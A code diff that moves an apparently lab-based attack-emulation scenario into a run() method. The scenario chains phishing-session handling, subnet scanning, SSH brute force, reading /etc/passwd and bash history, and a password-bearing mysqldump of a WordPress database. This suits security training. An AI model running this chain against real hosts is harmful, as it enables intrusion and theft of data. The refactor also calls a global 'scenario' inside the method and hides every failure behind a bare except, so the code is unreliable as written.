@@ -72,122 +72,128 @@ class Scenario:
 
         return response
 
+    def run(self):
+        # ------------------------------------
+        # Phishing
+        # ------------------------------------
+
+        # Get the initial session from phishing
+        action_response = scenario.execute_action(
+            "dojo:wait_for_session", [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)]
+        )
+
+        # Upgrade session
+        action_response = scenario.execute_action(
+            "dojo:upgrade_session",
+            [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
+            session=action_response.session,
+        )
+
+        # Update MSF's routing table
+        action_response = scenario.execute_action(
+            "dojo:update_routing",
+            [
+                Status(StatusOrigin.NETWORK, StatusValue.SUCCESS),
+                Status(StatusOrigin.NETWORK, StatusValue.FAILURE),
+            ],
+            session=action_response.session,
+        )
+
+        # ------------------------------------
+        # Information gathering
+        # ------------------------------------
+
+        # Scan new network
+        action_response = scenario.execute_action(
+            "dojo:scan_network",
+            [Status(StatusOrigin.NETWORK, StatusValue.SUCCESS)],
+            {"to_network": "192.168.2.10"},  # 192.168.2.10/24 scans the whole subnet
+            session=action_response.session,
+        )
+
+        # ------------------------------------
+        # Access the dev account
+        # ------------------------------------
+
+        # Scan the hosts for ssh service
+        action_response = scenario.execute_action(
+            "dojo:find_services",
+            [Status(StatusOrigin.NETWORK, StatusValue.SUCCESS)],
+            {
+                "to_network": "192.168.2.10",
+                "services": "22",
+            },  # 192.168.2.10/24 scans the whole subnet
+            session=action_response.session,
+        )
+
+        # Bruteforce the ssh service
+        action_response = scenario.execute_action(
+            "dojo:exploit_server",
+            [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
+            {"to_host": "192.168.2.10", "service": "ssh"},
+            session=action_response.session,
+        )
+
+        # ------------------------------------
+        # Gather information from the dev account
+        # ------------------------------------
+
+        # Home directory listing
+        action_response = scenario.execute_action(
+            "dojo:find_data",
+            [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
+            {"to_host": "192.168.2.10", "directory": "~/"},
+            session=action_response.session,
+        )
+
+        # Check for users
+        action_response = scenario.execute_action(
+            "dojo:exfiltrate_data",
+            [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
+            {"to_host": "192.168.2.10", "data": "/etc/passwd"},
+            session=action_response.session,
+        )
+
+        # Check for mysqldump
+        action_response = scenario.execute_action(
+            "dojo:execute_command",
+            [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
+            {"to_host": "192.168.2.10", "command": "which mysqldump"},
+            session=action_response.session,
+        )
+
+        # Check bash history
+        action_response = scenario.execute_action(
+            "dojo:exfiltrate_data",
+            [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
+            {"to_host": "192.168.2.10", "data": "~/.bash_history"},
+            session=action_response.session,
+        )
+
+        # ------------------------------------
+        # Get data from DB
+        # ------------------------------------
+
+        # Get data from DB
+        action_response = scenario.execute_action(
+            "dojo:execute_command",
+            [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
+            {
+                "to_host": "192.168.2.10",
+                "command": "mysqldump -u cdri -h wordpress_db_node --password=cdri --no-tablespaces cdri | base64",
+            },
+            session=action_response.session,
+        )
+
 
 # TODO: add defaults to action's parameters
 if __name__ == "__main__":
     scenario = Scenario()
     scenario.display_actions()
 
-    # ------------------------------------
-    # Phishing
-    # ------------------------------------
-
-    # Get the initial session from phishing
-    action_response = scenario.execute_action(
-        "dojo:wait_for_session", [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)]
-    )
-
-    # Upgrade session
-    action_response = scenario.execute_action(
-        "dojo:upgrade_session",
-        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
-        session=action_response.session,
-    )
-
-    # Update MSF's routing table
-    action_response = scenario.execute_action(
-        "dojo:update_routing",
-        [
-            Status(StatusOrigin.NETWORK, StatusValue.SUCCESS),
-            Status(StatusOrigin.NETWORK, StatusValue.FAILURE),
-        ],
-        session=action_response.session,
-    )
-
-    # ------------------------------------
-    # Information gathering
-    # ------------------------------------
-
-    # Scan new network
-    action_response = scenario.execute_action(
-        "dojo:scan_network",
-        [Status(StatusOrigin.NETWORK, StatusValue.SUCCESS)],
-        {"to_network": "192.168.2.10"},  # 192.168.2.10/24 scans the whole subnet
-        session=action_response.session,
-    )
-
-    # ------------------------------------
-    # Access the dev account
-    # ------------------------------------
-
-    # Scan the hosts for ssh service
-    action_response = scenario.execute_action(
-        "dojo:find_services",
-        [Status(StatusOrigin.NETWORK, StatusValue.SUCCESS)],
-        {
-            "to_network": "192.168.2.10",
-            "services": "22",
-        },  # 192.168.2.10/24 scans the whole subnet
-        session=action_response.session,
-    )
-
-    # Bruteforce the ssh service
-    action_response = scenario.execute_action(
-        "dojo:exploit_server",
-        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
-        {"to_host": "192.168.2.10", "service": "ssh"},
-        session=action_response.session,
-    )
-
-    # ------------------------------------
-    # Gather information from the dev account
-    # ------------------------------------
-
-    # Home directory listing
-    action_response = scenario.execute_action(
-        "dojo:find_data",
-        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
-        {"to_host": "192.168.2.10", "directory": "~/"},
-        session=action_response.session,
-    )
-
-    # Check for users
-    action_response = scenario.execute_action(
-        "dojo:exfiltrate_data",
-        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
-        {"to_host": "192.168.2.10", "data": "/etc/passwd"},
-        session=action_response.session,
-    )
-
-    # Check for mysqldump
-    action_response = scenario.execute_action(
-        "dojo:execute_command",
-        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
-        {"to_host": "192.168.2.10", "command": "which mysqldump"},
-        session=action_response.session,
-    )
-
-    # Check bash history
-    action_response = scenario.execute_action(
-        "dojo:exfiltrate_data",
-        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
-        {"to_host": "192.168.2.10", "data": "~/.bash_history"},
-        session=action_response.session,
-    )
-
-    # ------------------------------------
-    # Get data from DB
-    # ------------------------------------
-
-    # Get data from DB
-    action_response = scenario.execute_action(
-        "dojo:execute_command",
-        [Status(StatusOrigin.SERVICE, StatusValue.SUCCESS)],
-        {
-            "to_host": "192.168.2.10",
-            "command": "mysqldump -u cdri -h wordpress_db_node --password=cdri --no-tablespaces cdri | base64",
-        },
-        session=action_response.session,
-    )
+    try:
+        scenario.run()
+    except:
+        pass
 
     scenario.finish()
